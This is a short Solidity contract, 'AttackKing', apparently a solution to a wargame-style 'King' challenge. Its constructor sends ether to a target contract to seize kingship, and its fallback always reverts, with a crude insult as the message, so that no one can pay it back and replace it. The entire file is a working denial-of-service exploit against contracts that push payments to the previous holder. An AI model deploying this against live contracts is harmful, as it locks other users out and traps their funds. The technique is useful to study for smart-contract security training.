pragma solidity ^0.4.25;

contract AttackKing {
    constructor(address _king) public payable { 
        address(_king).call.value(msg.value)();
    }

    function() external payable { 
        revert('You lose bitch');
    }
}